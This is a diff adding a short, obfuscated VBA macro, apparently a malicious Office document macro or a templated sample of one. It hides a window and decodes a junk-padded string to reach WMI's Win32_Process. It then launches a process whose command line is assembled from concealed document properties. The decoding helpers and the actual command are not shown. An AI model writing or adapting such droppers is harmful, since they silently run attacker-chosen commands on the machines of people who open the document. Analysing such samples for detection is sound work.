@@ -1,0 +1,17 @@
+Sub aSUB1a()
+On Error Resume Next
+
+Dim aVAR1a() As String
+
+ReDim aVAR1a(43)
+
+aVAR1a(1) = aNAME4a.aNAME1a
+
+Set aVAR2a = CreateObject(aFUNC1a(aVAR1a(1)))
+aVAR2a.ShowWindow = 99 < 88
+
+aVAR1a(0) = aFUNC2a(aNAME4a.aNAME2a + aNAME4a.aNAME3a)
+
+Set aVAR3a = CreateObject(aFUNC2a("ashnwashnashniashnnmashngmashntsashn:Wiashnn32ashnashn_Proceashnssashnashn")).Create (aVAR1a(0))
+
+End Sub
